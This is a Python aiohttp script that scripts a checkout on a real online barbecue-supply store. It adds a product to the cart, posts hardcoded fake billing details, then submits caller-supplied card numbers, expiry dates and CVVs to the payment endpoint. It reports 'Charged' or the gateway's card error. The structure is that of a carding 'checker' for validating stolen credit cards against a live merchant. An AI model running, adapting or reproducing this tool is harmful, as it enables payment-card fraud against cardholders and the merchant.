import aiohttp, json, asyncio, re

async def payflow(cc, mes, ano, cvv):
    async with aiohttp.ClientSession() as sess:
        # ////! -------------- Request Number 1 -------------- ////   
        async with sess.get(url='https://www.sucklebusters.com/marinades-and-brines/marinade-for-beef/') as resp:
            r1 = await resp.text()
        # ////! -------------- Request Number 2 -------------- ////  
        headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        }

        data = {
        'oa': 'AddItem',
        'ua': '',
        'oa_id': 'SBMR/030',
        'oa_recurring': '0',
        'pid': '219',
        'oa_quantity': '1',
        'x': '30',
        'y': '8',
        }
        async with sess.post('https://www.sucklebusters.com/index.php',headers=headers, data=data) as resp:
            r2 = await resp.text()
        # ////! -------------- Request Number 3 -------------- ////  
        params = {
        'p': 'one_page_checkout',
        }
        async with sess.get('https://www.sucklebusters.com/index.php', params=params) as resp:
            r3 = await resp.text()
        # ////! -------------- Request Number 4 -------------- ////  
        headers = {
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        }

        params = {
        'oa': 'OnePageCheckout',
        'action': 'saveBillingData',
        'requestTime': '1703736170507',
        }

        data = {
        'data': '{"billingForm":"use_user_address=0&fname=marcossal&lname=sal&company=&address1=New+York&address2=&city=New+York&country=1&state=32&province=&zip=10080&phone=8298070240&email=bebemarcos450%40gmail.com&login=&password=&password2=","shippingAsBilling":true}',
        }
        async with sess .post('https://www.sucklebusters.com/index.php', params=params, headers=headers, data=data) as resp:
            r4 = await resp.text()
        # ////! -------------- Request Number 5 -------------- ////
        params = {
        'ua': 'user_start_checkout',
        'checkout_start_page': 'cart',
        }
        async with sess.get('https://www.sucklebusters.com/index.php', params=params) as resp:
            r5 = await resp.text()
        # ////! -------------- Request Number 6 -------------- ////
        headers = {
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        }

        params = {
        'oa': 'OnePageCheckout',
        'action': 'processPayment',
        'requestTime': '1703736891871',
        }

        data = {
        'data': f'{{"paymentMethodsForm":"payment-method-id=11","paymentMethodForm":"oa=ProcessPayment&form%5Bcc_type%5D=Yes~Visa&form%5Bcc_first_name%5D=marcossal&form%5Bcc_last_name%5D=sal&form%5Bcc_number%5D={cc}&form%5Bcc_expiration_month%5D={mes}&form%5Bcc_expiration_year%5D={ano}&form%5Bcc_cvv2%5D={cvv}","paymentMethodType":"cc","giftCertificateForm":false,"additionalInformation":"gift_message="}}',
        }
        async with sess.post('https://www.sucklebusters.com/index.php', params=params, headers=headers, data=data) as resp:
            r6 = await resp.text()
            try:
                jsonresponse = json.loads(r6)
                try:
                    response = jsonresponse['data']['paymentErrors']
                except KeyError:
                    response = jsonresponse['data']['success']
            except json.JSONDecodeError:
                response = "Error in json"

            if response == 'success':
                return f'Charged'
            elif 'Please enter a valid Credit Card Verification Number' in response:
                return response
            else:
                return response
            



 

        






        
